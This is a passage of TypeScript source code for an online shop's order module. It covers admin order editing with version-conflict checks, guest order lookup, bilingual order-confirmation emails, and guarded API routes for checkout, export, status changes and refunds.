      const { issueGiftCardsForOrder } = await import('./giftcards/service');
      await issueGiftCardsForOrder(id);
    } catch (err) {
      console.error('[commerce/orders] gift card issue failed', id, err);
    }
  }

  // Notify the customer on shipping/cancellation/refund (best-effort).
  await sendOrderStatusEmail(id, status);
  return getAdminOrder(id);
}

// ── Admin edit / manual order ────────────────────────────────────────────────

export interface OrderEditItem {
  /**
   * The stored line this row was, when the editor kept an existing one. Kept
   * lines are updated in place so they keep their snapshot (a gift card) and
   * variation; see `planOrderLines`.
   */
  id?: number;
  name: string;
  sku?: string;
  variantLabel?: string;
  /** Major units. */
  unitPrice: number;
  quantity: number;
  productId?: number;
}
export interface OrderEditInput {
  email: string;
  customerName?: string;
  phone?: string;
  address1?: string;
  city?: string;
  postal?: string;
  country?: string;
  notes?: string;
  currency: string;
  locale?: string;
  items: OrderEditItem[];
  /** Cost overrides in major units. */
  shipping: number;
  discount: number;
  surcharge: number;
  /**
   * The gift-wrap fee that was charged, in major units.
   *
   * Optional and, when absent, carried over from the stored order rather than
   * dropped — the editor never had this field, so every admin save rebuilt
   * `metadata.costs` without it and recomputed a total that left the fee out. An
   * order that had gift wrap came out of an unrelated edit — fixing a typo in the
   * customer's name — still flagged `gift.wrap: true` and charging as though it were
   * not wrapped, while the `payments` row kept the original amount. A total that
   * disagrees with its own line items, produced by saving a form (F-067).
   */
  giftWrap?: number;
  coupon?: string;
  /**
   * The order's `version` as the editor read it.
   *
   * A save replaces the order outright — every `order_items` row is deleted and the
   * caller's list reinserted — with nothing to notice that the copy being replaced is
   * not the copy that was read. Two admins on one order meant the second save undid
   * the first: an operator correcting a phone number silently removed the line item a
   * colleague had just added, and reverted the total, with no conflict and no warning
   * (F-068). The document editor already refuses this (F-011); orders had no such
   * check and no field to check against.
   *
   * A counter rather than `updated_at`, which was the first attempt and is not good
   * enough: `updated_at` is a TIMESTAMP with second resolution, so two saves inside the
   * same second compare equal — and that is precisely when a collision happens.
   *
   * REQUIRED when replacing an existing order, and only then — a create has nothing to
   * conflict with. Optional would be no protection at all: the caller whose work is
   * about to be destroyed is precisely the one holding a stale copy, and it would
   * simply not send the field. Nothing updates an order without having read it first.
   */
  expectedVersion?: number;
}

/**
 * Create (id = null) or fully replace (id set) an order from the admin editor.
 * Recomputes subtotal/total from the lines; does NOT touch stock, payments or
 * emails (the admin controls those explicitly). Lines sent back with their id
 * are updated in place, keeping their snapshot and variation.
 */
export async function saveOrder(
  id: number | null,
  input: OrderEditInput,
  /** Site facts the core cannot read itself; the admin route binders supply them. */
  site: { defaultLocale: string },
) {
  const db = getDb();
  const year = new Date().getFullYear();

  // Metadata the editor doesn't manage (fulfilment method + pickup store, the
  // consent record, gift options) is carried over so an admin edit can't drop it.
  const [existing] = id
    ? await db
        .select({ metadata: schema.orders.metadata, total: schema.orders.total })
        .from(schema.orders)
        .where(eq(schema.orders.id, id))
        .limit(1)
    : [];
  const prevMeta = (existing?.metadata ?? {}) as Record<string, unknown>;
  const prevShipping = (prevMeta.shipping ?? {}) as Record<string, unknown>;

  const items = input.items.map((i) => {
    const unitPrice = toMinor(i.unitPrice);
    return {
      id: i.id,
      name: i.name,
      sku: i.sku ?? null,
      variantLabel: i.variantLabel ?? null,
      unitPrice,
      quantity: i.quantity,
      lineTotal: unitPrice * i.quantity,
      productId: i.productId ?? null,
    };
  });
  const subtotal = items.reduce((s, i) => s + i.lineTotal, 0);
  const shipping = toMinor(input.shipping);
  const discount = toMinor(input.discount);
  const surcharge = toMinor(input.surcharge);
  /*
   * Kept, not recomputed from the setting. What matters on an existing order is what
   * the customer was actually charged; re-deriving it from today's gift-wrap fee
   * would rewrite history every time the setting changed.
   */
  const prevCosts = (prevMeta.costs ?? {}) as Record<string, unknown>;
  const giftWrap =
    input.giftWrap !== undefined
      ? toMinor(input.giftWrap)
      : typeof prevCosts.giftWrap === 'number' && Number.isSafeInteger(prevCosts.giftWrap) && prevCosts.giftWrap >= 0
        ? prevCosts.giftWrap
        : 0;
  const { total } = computeOrderTotals({ subtotal, discount, shipping, surcharge, giftWrap });
  // A cash-on-delivery order: the courier collects the edited total, less what
  // gift cards already paid.
  const codAmount = rebaseCodAmount({
    prevCod: prevMeta.codAmount,
    prevTotal: existing?.total ?? 0,
    total,
  });
  const metadata = {
    ...prevMeta,
    ...(codAmount !== undefined ? { codAmount } : {}),
    shipping: {
      ...prevShipping,
      phone: input.phone ?? null,
      address1: input.address1 ?? null,
      city: input.city ?? null,
      postal: input.postal ?? null,
      country: input.country ?? null,
    },
    // Costs are always the editor's — the total is recomputed from these fields.
    costs: { shipping, surcharge, discount, giftWrap },
    ...(input.coupon ? { coupon: input.coupon } : {}),
  };

  const savedId = await db.transaction(async (tx) => {
    let orderId = id;
    /** The order's lines as stored, read under the lock; none for a new order. */
    let stored: StoredOrderLine[] = [];
    if (orderId) {
      {
        if (input.expectedVersion === undefined) {
          throw new ApiError(
            'bad_request',
            'A save has to state the version of the order it was made from. Reload the ' +
              'order and try again.',
          );
        }
        /*
         * Inside the transaction and behind a row lock, because checking before it
         * would only narrow the window rather than close it — the other save could
         * land between the check and the write.
         */
        const [locked] = await tx
          .select({ version: schema.orders.version })
          .from(schema.orders)
          .where(eq(schema.orders.id, orderId))
          .for('update')
          .limit(1);
        if (!locked) throw new ApiError('not_found', 'That order no longer exists.');
        if (locked.version !== input.expectedVersion) {
          throw new ApiError(
            'conflict',
            'This order was changed by someone else while you had it open. Reload to see ' +
              'their version — saving now would replace their work, including any line ' +
              'items they added.',
          );
        }
      }
      await tx
        .update(schema.orders)
        .set({
          email: input.email,
          customerName: input.customerName ?? null,
          currency: input.currency,
          locale: localeOrDefault(input.locale, site.defaultLocale),
          subtotal,
          total,
          notes: input.notes ?? null,
          metadata,
          // The token the next save will have to match.
          version: sql`${schema.orders.version} + 1`,
        })
        .where(eq(schema.orders.id, orderId));
      stored = await tx
        .select({
          id: schema.orderItems.id,
          productId: schema.orderItems.productId,
          variationId: schema.orderItems.variationId,
          snapshot: schema.orderItems.snapshot,
        })
        .from(schema.orderItems)
        .where(eq(schema.orderItems.orderId, orderId));
    } else {
      const res = await tx.insert(schema.orders).values({
        reference: crypto.randomUUID().replace(/-/g, '').slice(0, 30),
        status: 'pending',
        email: input.email,
        customerName: input.customerName ?? null,
        currency: input.currency,
        subtotal,
        total,
        locale: localeOrDefault(input.locale, site.defaultLocale),
        notes: input.notes ?? null,
        metadata,
      });
      orderId = adapter.insertId(res);
      await tx
        .update(schema.orders)
        // Same unguessable reference as the checkout path — an order created by
        // hand in the admin is looked up by the guest through the same endpoint.
        .set({ reference: `ORD-${year}-${orderSuffix()}` })
        .where(eq(schema.orders.id, orderId));
    }
    /*
     * Lines the editor kept are updated in place rather than deleted and
     * reinserted: a reinserted line lost its snapshot and variation, so a gift
     * card line edited before payment never minted its card.
     */
    const plan = planOrderLines(stored, items);
    if (plan.remove.length > 0) {
      await tx
        .delete(schema.orderItems)
        .where(and(eq(schema.orderItems.orderId, orderId), inArray(schema.orderItems.id, plan.remove)));
    }
    for (const { id: lineId, values } of plan.update) {
      await tx
        .update(schema.orderItems)
        .set(values)
        .where(and(eq(schema.orderItems.id, lineId), eq(schema.orderItems.orderId, orderId)));
    }
    for (const values of plan.insert) await tx.insert(schema.orderItems).values({ ...values, orderId });
    return orderId;
  });

  return getOrder(savedId);
}

/** Guest order lookup — reference + matching email (case-insensitive). */
export async function lookupOrder(reference: string, email: string) {
  const db = getDb();
  const [order] = await db
    .select()
    .from(schema.orders)
    .where(eq(schema.orders.reference, reference.trim()))
    .limit(1);
  if (!order) return null;
  if (order.email.toLowerCase() !== email.trim().toLowerCase()) return null;
  const full = await getOrder(order.id);
  // Scrubbed here rather than at the route, so every caller of the *guest*
  // lookup gets the narrow shape and nobody has to remember to strip it.
  return full ? publicOrder(full) : null;
}

// ── Emails ───────────────────────────────────────────────────────────────────

const EMAIL_LABELS: Record<'el' | 'en', Record<string, string>> = {
  el: {
    subjectCustomer: 'Η παραγγελία σας',
    subjectAdmin: 'Νέα παραγγελία',
    subjectStatus: 'Ενημέρωση παραγγελίας',
    greeting: 'Ευχαριστούμε για την παραγγελία σας! Λάβαμε την παραγγελία σας και θα επικοινωνήσουμε σύντομα.',
    order: 'Κωδικός παραγγελίας',
    item: 'Προϊόν',
    qty: 'Ποσ.',
    amount: 'Ποσό',
    subtotal: 'Υποσύνολο',
    discount: 'Έκπτωση',
    shipping: 'Μεταφορικά',
    surcharge: 'Επιβάρυνση',
    giftWrap: 'Συσκευασία δώρου',
    total: 'Σύνολο',
    shipTo: 'Αποστολή σε',
    pickupAt: 'Παραλαβή από το κατάστημα',
    statusFulfilled: 'Η παραγγελία σας απεστάλη.',
    statusCancelled: 'Η παραγγελία σας ακυρώθηκε.',
    statusRefunded: 'Η παραγγελία σας επιστράφηκε.',
  },
  en: {
    subjectCustomer: 'Your order',
    subjectAdmin: 'New order',
    subjectStatus: 'Order update',
    greeting: 'Thank you for your order! We have received it and will be in touch shortly.',
    order: 'Order reference',
    item: 'Item',
    qty: 'Qty',
    amount: 'Amount',
    subtotal: 'Subtotal',
    discount: 'Discount',
    shipping: 'Shipping',
    surcharge: 'Surcharge',
    giftWrap: 'Gift wrap',
    total: 'Total',
    shipTo: 'Ship to',
    pickupAt: 'Collect in store',
    statusFulfilled: 'Your order has been shipped.',
    statusCancelled: 'Your order has been cancelled.',
    statusRefunded: 'Your order has been refunded.',
  },
};

/** Order statuses that warrant a customer email when set. */
const STATUS_EMAIL: Record<string, 'statusFulfilled' | 'statusCancelled' | 'statusRefunded'> = {
  fulfilled: 'statusFulfilled',
  cancelled: 'statusCancelled',
  refunded: 'statusRefunded',
};

function escapeHtml(value: string): string {
  return value
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

function formatMoney(cents: number, currency: string, locale: string): string {
  const intlLocale = locale === 'el' ? 'el-GR' : 'en-US';
  try {
    return new Intl.NumberFormat(intlLocale, { style: 'currency', currency }).format(cents / 100);
  } catch {
    return `${(cents / 100).toFixed(2)} ${currency}`;
  }
}

/** Recipients for the admin notification (comma/newline-separated setting). */
function parseRecipients(value: unknown): string[] {
  if (typeof value !== 'string') return [];
  return value
    .split(/[,\n]/)
    .map((s) => s.trim())
    .filter((s) => s.includes('@'));
}

async function safeSend(mail: Parameters<typeof sendGraphMail>[0]): Promise<void> {
  try {
    await sendGraphMail(mail);
  } catch (err) {
    // Best-effort: a mail outage (or missing Graph env) must never fail an order.
    console.error('[commerce/orders] email send failed', err);
  }
}

/**
 * Send the customer confirmation + admin notification for an order. Never
 * throws — mail failures are logged, not surfaced.
 */
export async function sendOrderEmails(orderId: number): Promise<void> {
  const order = await getOrder(orderId);
  if (!order) return;

  const locale: 'el' | 'en' = order.locale === 'el' ? 'el' : 'en';
  const L = EMAIL_LABELS[locale];
  const esc = escapeHtml;

  const rows = order.items
    .map(
      (i) =>
        `<tr>` +
        `<td style="padding:6px 12px;">${esc(i.name)}${i.variantLabel ? ` — ${esc(i.variantLabel)}` : ''}</td>` +
        `<td style="padding:6px 12px;text-align:center;">${i.quantity}</td>` +
        `<td style="padding:6px 12px;text-align:right;white-space:nowrap;">${formatMoney(i.lineTotal, order.currency, locale)}</td>` +
        `</tr>`,
    )
    .join('');

  // Every charge the total is made of, gift wrap included, so the lines add up.
  const summary = orderSummaryLines({
    subtotal: order.subtotal,
    total: order.total,
    costs: (order.metadata?.costs ?? {}) as Record<string, unknown>,
  });
  const footRow = (label: string, cents: number, bold = false) => {
    const style = bold ? `font-weight:600;border-top:1px solid ${emailColor('border-soft')};` : '';
    return (
      `<tr><td colspan="2" style="padding:4px 12px;${style}">${label}</td>` +
      `<td style="padding:4px 12px;text-align:right;${style}">${formatMoney(cents, order.currency, locale)}</td></tr>`
    );
  };

  const table =
    `<table style="border-collapse:collapse;font-family:Arial,Helvetica,sans-serif;font-size:14px;color:#1a1a1a;">` +
    `<thead><tr>` +
    `<th style="padding:6px 12px;text-align:left;border-bottom:1px solid ${emailColor('border-soft')};">${L.item}</th>` +
    `<th style="padding:6px 12px;text-align:center;border-bottom:1px solid ${emailColor('border-soft')};">${L.qty}</th>` +
    `<th style="padding:6px 12px;text-align:right;border-bottom:1px solid ${emailColor('border-soft')};">${L.amount}</th>` +
    `</tr></thead><tbody>${rows}</tbody>` +
    `<tfoot>` +
    summary.map((line) => footRow(L[line.key], line.cents, line.key === 'total')).join('') +
    `</tfoot></table>`;

  const shipping = (order.metadata?.shipping ?? {}) as Record<string, unknown>;
  // A collected order shows the store instead of a delivery address (§8).
  const isPickup = shipping.method === 'pickup';
  const pickup = (shipping.pickup ?? null) as { name?: string; address?: string | null } | null;
  const shipStr = isPickup
    ? [pickup?.name, pickup?.address]
        .filter((v): v is string => typeof v === 'string' && v.length > 0)
        .map(esc)
        .join(' — ')
    : [shipping.address1, shipping.city, shipping.postal, shipping.country]
        .filter((v): v is string => typeof v === 'string' && v.length > 0)
        .map(esc)
        .join(', ');
  const shipLabel = isPickup ? L.pickupAt : L.shipTo;

  const meta =
    `<p style="font-family:Arial,Helvetica,sans-serif;font-size:14px;color:#1a1a1a;">` +
    `${L.order}: <strong>${esc(order.reference)}</strong></p>` +
    (isPickup || shipStr
      ? `<p style="font-family:Arial,Helvetica,sans-serif;font-size:13px;color:#555;">${shipLabel}${shipStr ? `: ${shipStr}` : ''}</p>`
      : '');

  // Customer confirmation.
  await safeSend({
    to: order.email,
    subject: `${L.subjectCustomer} ${order.reference}`,
    html:
      `<p style="font-family:Arial,Helvetica,sans-serif;font-size:14px;color:#1a1a1a;">${L.greeting}</p>` +
      meta +
      table,
  });

  // Admin notification — to the configured recipients, else the mailer default.
  const adminHtml =
    `<p style="font-family:Arial,Helvetica,sans-serif;font-size:14px;color:#1a1a1a;">` +
    `${esc(order.customerName ?? '')} · ${esc(order.email)}</p>` +
    meta +
    table;
  const recipients = parseRecipients(await getSetting('notifications.inquiryEmails'));
  const targets = recipients.length > 0 ? recipients : [undefined];
  for (const to of targets) {
    await safeSend({
      to,
      subject: `${L.subjectAdmin} ${order.reference}`,
      html: adminHtml,
      replyTo: order.email,
      replyToName: order.customerName ?? undefined,
    });
  }
}

/** Notify the customer when an order is shipped/cancelled/refunded. Never throws. */
export async function sendOrderStatusEmail(orderId: number, status: string): Promise<void> {
  const key = STATUS_EMAIL[status];
  if (!key) return;
  const order = await getOrder(orderId);
  if (!order) return;
  const locale: 'el' | 'en' = order.locale === 'el' ? 'el' : 'en';
  const L = EMAIL_LABELS[locale];
  await safeSend({
    to: order.email,
    subject: `${L.subjectStatus} ${order.reference}`,
    html:
      `<p style="font-family:Arial,Helvetica,sans-serif;font-size:14px;color:#1a1a1a;">${L[key]}</p>` +
      `<p style="font-family:Arial,Helvetica,sans-serif;font-size:14px;color:#1a1a1a;">` +
      `${L.order}: <strong>${escapeHtml(order.reference)}</strong></p>`,
  });
}

// ── Route factories ──────────────────────────────────────────────────────────

const checkoutBody = z.object({
  customer: z.object({
    name: z.string().trim().min(1).max(191),
    email: z.string().trim().email().max(254),
    phone: z.string().trim().max(64).optional(),
    // Optional in the schema — a digital-only cart has no address. The server
    // still requires them below when the cart contains a physical product.
    address1: z.string().trim().max(255).optional(),
    city: z.string().trim().max(128).optional(),
    postal: z.string().trim().max(32).optional(),
    country: z.string().trim().max(64).optional(),
  }),
  notes: z.string().trim().max(4000).optional(),
  couponCode: z.string().trim().max(64).optional(),
  locale: z.string().trim().max(8),
  // Fulfilment (§8): delivery by default, or collection from a store.
  delivery: z.enum(['ship', 'pickup']).optional(),
  pickupLocationId: z.string().trim().max(64).optional(),
  // Compliance + gift options (§9).
  acceptTerms: z.boolean().default(false),
  marketingOptIn: z.boolean().optional(),
  giftWrap: z.boolean().optional(),
  giftMessage: z.string().trim().max(500).optional(),
  /** "Create an account for me" plus the password to use. Honoured only when
   *  the customers module is on and nobody is signed in — see `planCheckoutAccount`. */
  createAccount: z.boolean().optional(),
  accountPassword: z.string().min(1).max(200).optional(),
  /** The chosen shipping method and, for a locker, which locker. */
  giftCardCodes: z.array(z.string().trim().min(4).max(32)).max(5).optional(),
  shippingMethodId: z.coerce.number().int().positive().optional(),
  lockerId: z.string().trim().max(64).optional(),
  lockerName: z.string().trim().max(191).optional(),
  items: z
    .array(
      z.object({
        slug: z.string().trim().max(191),
        variationId: z.string().trim().max(64).optional(),
        quantity: z.coerce.number().int().positive().max(999),
        /*
         * A gift card line's choices. Shape only here; whether the amount is one
         * the shop sells is decided against the settings in `createOrder`.
         */
        giftCard: z
          .object({
            amount: z.coerce.number().int().positive().max(100_000_00),
            recipientName: z.string().trim().max(191).optional(),
            recipientEmail: z.string().trim().email().max(255),
            message: z.string().trim().max(500).optional(),
            sendAt: z
              .string()
              .regex(/^\d{4}-\d{2}-\d{2}$/)
              .optional(),
          })
          .strict()
          .optional(),
      }),
    )
    .min(1)
    .max(100),
});

/** Public POST — mount from a module-gated binder: `export const POST = createCheckoutRoute()`. */
export interface CheckoutRouteOptions {
  /**
   * Whether newsletter capture is on. A checkout opt-in is ignored when it is
   * not — the tick is hidden client-side, and hiding a checkbox is not a
   * control: a forged body would otherwise record marketing consent on the
   * order and add a subscriber to a list the site has switched off.
   *
   * Supplied by the site's route binder, because this module must not read the
   * site config. Absent, the opt-in is honoured as before.
   */
  newsletterEnabled?: () => boolean | Promise<boolean>;
  /**
   * The site's default locale (`config.defaultLocale`): stored on an order that
   * arrives without one, and the locale the payment return link leaves unprefixed.
   */
  defaultLocale: string;
  /**
   * The account side of checkout, supplied by the binder so this module does
   * not depend on the customers module or the site config.
   *
   * `resolveAccount` reports who is signed in and whether accounts are on at
   * all; `attachAccount` runs AFTER the order is committed and may create one.
   * Both are optional: without them checkout behaves exactly as it did.
   */
  resolveAccount?: () => Promise<{ enabled: boolean; customerId: number | null }>;
  attachAccount?: (args: {
    orderId: number;
    email: string;
    name: string;
    phone?: string;
    locale: string;
    createAccount: boolean;
    password: string;
    signedInCustomerId: number | null;
    accountsEnabled: boolean;
  }) => Promise<void>;
}

export function createCheckoutRoute(opts: CheckoutRouteOptions) {
  return createRoute({
    rateLimit: { scope: 'commerce-checkout', max: 10, windowMs: 60_000 },
    input: checkoutBody,
    handler: async ({ input }) => {
      // Resolved once and passed through, so the consent recorded on the order
      // and the subscription itself can never disagree.
      const marketingOptIn =
        Boolean(input.marketingOptIn) &&
        (opts.newsletterEnabled ? await opts.newsletterEnabled() : true);
      const account = opts.resolveAccount
        ? await opts.resolveAccount()
        : { enabled: false, customerId: null };
      const order = await createOrder(
        {
          ...input,
          marketingOptIn,
          // Never from the body: who is signed in is the session's answer.
          customerId: account.enabled ? account.customerId : null,
          // The whole cart checks out in the current page locale.
          items: input.items.map((it) => ({ ...it, locale: input.locale })),
        },
        { defaultLocale: opts.defaultLocale },
      );
      /*
       * After the order is safely stored, and never allowed to undo it: an
       * account is a convenience, and failing a paid-for order because a
       * password was rejected would be the wrong way round.
       */
      if (opts.attachAccount) {
        try {
          await opts.attachAccount({
            orderId: order.id,
            email: input.customer.email,
            name: input.customer.name,
            phone: input.customer.phone,
            locale: input.locale,
            createAccount: Boolean(input.createAccount),
            password: input.accountPassword ?? '',
            signedInCustomerId: account.customerId,
            accountsEnabled: account.enabled,
          });
        } catch (err) {
          console.error('[commerce/checkout] account step failed', err);
        }
      }
      // Best-effort confirmation + admin notification (never fails the order).
      await sendOrderEmails(order.id);
      return ok({
        reference: order.reference,
        redirectUrl: order.redirectUrl,
        clientSecret: order.clientSecret,
      });
    },
  });
}

const lookupBody = z.object({
  reference: z.string().trim().min(1).max(32),
  email: z.string().trim().email().max(254),
});

/** Public POST — guest order lookup (reference + email). Module-gated by the binder. */
export function createOrderLookupRoute() {
  return createRoute({
    rateLimit: { scope: 'commerce-order-lookup', max: 20, windowMs: 60_000 },
    input: lookupBody,
    handler: async ({ input }) => {
      const order = await lookupOrder(input.reference, input.email);
      if (!order) throw notFound('Order not found.');
      return ok(order);
    },
  });
}

const ordersQuery = z.object({
  /** Reference, email or customer name — see `listOrders`. */
  search: z.string().trim().max(191).optional(),
  page: z.coerce.number().int().positive().optional(),
  pageSize: z.coerce.number().int().positive().max(100).optional(),
  status: z.enum(orderStatusValues).optional(),
});

export function ordersListRoute() {
  return createRoute({
    guard: () => requireApiPerm(PERMISSIONS.ordersRead),
    query: ordersQuery,
    handler: async ({ query }) => {
      const { items, total, page, pageSize } = await listOrders(query ?? {});
      return paginated(items, { page, pageSize, total });
    },
  });
}

const exportQuery = z.object({
  status: z.enum(orderStatusValues).optional(),
  from: z.string().max(40).optional(),
  to: z.string().max(40).optional(),
});

/** GET — download filtered orders as CSV. Module-gated by the binder. */
export function orderExportRoute() {
  return createRoute({
    guard: () => requireApiPerm(PERMISSIONS.ordersRead),
    query: exportQuery,
    handler: async ({ query }) => {
      const csv = await exportOrdersCsv(query ?? {});
      return new Response(csv, {
        headers: {
          'Content-Type': 'text/csv; charset=utf-8',
          'Content-Disposition': 'attachment; filename="orders.csv"',
        },
      });
    },
  });
}

export function orderGetRoute() {
  return createRoute({
    guard: () => requireApiPerm(PERMISSIONS.ordersRead),
    handler: async ({ params }) => {
      const order = await getAdminOrder(idParam(params.id));
      if (!order) throw notFound('Order not found.');
      return ok(order);
    },
  });
}

const orderUpdateBody = z.object({ status: z.enum(orderStatusValues) });

export function orderUpdateRoute() {
  return createRoute({
    guard: () => requireApiPerm(PERMISSIONS.ordersWrite),
    input: orderUpdateBody,
    handler: async ({ params, input, auth }) => {
      const id = idParam(params.id);
      const before = await getOrder(id);
      if (!before) throw notFound('Order not found.');
      // The lifecycle (see `order-status.ts`): e.g. a cancelled order is final.
      if (!canMoveOrderStatus(before.status, input.status)) {
        throw conflict(`An order that is ${before.status} cannot be moved to ${input.status}.`);
      }
      // From the status just checked, so a move made meanwhile (a webhook, the
      // stale-order job, another admin) is not overwritten by this one.
      const order = await updateOrderStatus(id, input.status, { onlyFrom: before.status });
      if (!order) throw conflict('This order changed while you were looking at it. Reload it and try again.');
      await logAudit({
        userId: auth.userId,
        action: 'order.status',
        subjectType: 'order',
        subjectId: id,
        before: { status: before.status },
        after: { status: input.status },
      });
      return ok(order);
    },
  });
}

const orderRefundBody = z.object({
  paymentId: z.coerce.number().int().min(1),
  amount: z.coerce.number().int().min(1).optional(),
  reason: z.string().trim().max(191).optional(),
});

/**
 * `POST /api/cms/orders/[id]/refund` — send the money back through the gateway.
 *
 * Moving the order to `refunded` is what restocks it, so that is done here
 * rather than left to the provider's refund webhook: the webhook is a
 * reconciliation, and by the time it lands the same transition has already been
 * made and is a no-op.
 */
export function orderRefundRoute() {
  return createRoute({
    guard: () => requireApiPerm(PERMISSIONS.ordersWrite),
    input: orderRefundBody,
    rateLimit: { scope: 'order-refund', max: 20, windowMs: 60_000 },
    handler: async ({ params, input, auth }) => {
      const id = idParam(params.id);
      const result = await refundOrderPayment({
        paymentId: input.paymentId,
        orderId: id,
        amount: input.amount,
        reason: input.reason,
      });
      if (result.orderId !== id) throw notFound('That payment belongs to another order.');

      // Only a payment refunded in full moves the order; a partial refund must
      // not restock every line and tell the customer they got everything back.
      const next = orderStatusAfterRefund(result);
      // Guarded, because the provider's refund webhook applies the same rule and
      // may already have moved the order; the second move must not act again.
      if (next) await updateOrderStatus(id, next, { unlessAlready: true });
      await logAudit({
        userId: auth.userId,
        action: 'order.refund',
        subjectType: 'order',
        subjectId: id,
        after: { amount: result.refunded, provider: result.providerRef, reason: input.reason ?? null },
      });
      return ok({ ...result, order: await getAdminOrder(id) });
    },
  });
}

const orderEditBody = z.object({
  email: z.string().trim().email().max(254),
  customerName: z.string().trim().max(191).optional(),
  phone: z.string().trim().max(64).optional(),
  address1: z.string().trim().max(255).optional(),
  city: z.string().trim().max(128).optional(),
  postal: z.string().trim().max(32).optional(),
  country: z.string().trim().max(64).optional(),
  notes: z.string().trim().max(4000).optional(),
  currency: z.string().trim().min(1).max(3),
  locale: z.string().trim().max(8).optional(),
  items: z
    .array(
      z.object({
        /* The stored line this was; absent for a line added in the editor. */
        id: z.coerce.number().int().positive().optional(),
        name: z.string().trim().min(1).max(255),
        sku: z.string().trim().max(64).optional(),
        variantLabel: z.string().trim().max(191).optional(),
        unitPrice: z.coerce.number().min(0),
        quantity: z.coerce.number().int().positive().max(9999),
        productId: z.coerce.number().int().positive().optional(),
      }),
    )
    .max(200),
  shipping: z.coerce.number().min(0).default(0),
  discount: z.coerce.number().min(0).default(0),
  surcharge: z.coerce.number().min(0).default(0),
  /* Deliberately no default: absent means "leave what the order already had". */
  giftWrap: z.coerce.number().min(0).optional(),
  coupon: z.string().trim().max(64).optional(),
  /* What the editor read. See `OrderEditInput.expectedVersion`. */
  expectedVersion: z.coerce.number().int().positive().optional(),
});

/** POST /api/cms/orders — create a manual order. */
export function orderCreateRoute(opts: {
  /** The site's default locale (`config.defaultLocale`), stored on a manual order created without one. */
  defaultLocale: string;
}) {
  return createRoute({
    guard: () => requireApiPerm(PERMISSIONS.ordersWrite),
    input: orderEditBody,
    handler: async ({ input, auth }) => {
      const order = await saveOrder(null, input, { defaultLocale: opts.defaultLocale });
      await logAudit({
        userId: auth.userId,
        action: 'order.create',
        subjectType: 'order',
        subjectId: order?.id,
        after: order ? { reference: order.reference, total: order.total } : undefined,
      });
      return created(order);
    },
  });
}

/** PUT /api/cms/orders/:id — full edit / replace of an order. */
export function orderSaveRoute(opts: {
  /** The site's default locale (`config.defaultLocale`), stored when an edited order has none. */
  defaultLocale: string;
}) {
  return createRoute({
    guard: () => requireApiPerm(PERMISSIONS.ordersWrite),
    input: orderEditBody,
    handler: async ({ params, input, auth }) => {
      const id = idParam(params.id);
      await assertNotLockedByOther('order', orderLockKey(id), auth.userId);
      const order = await saveOrder(id, input, { defaultLocale: opts.defaultLocale });
      if (!order) throw notFound('Order not found.');
      await logAudit({
        userId: auth.userId,
        action: 'order.edit',
        subjectType: 'order',
        subjectId: id,
        after: { reference: order.reference, total: order.total },
      });
      return ok(order);
    },
  });
}
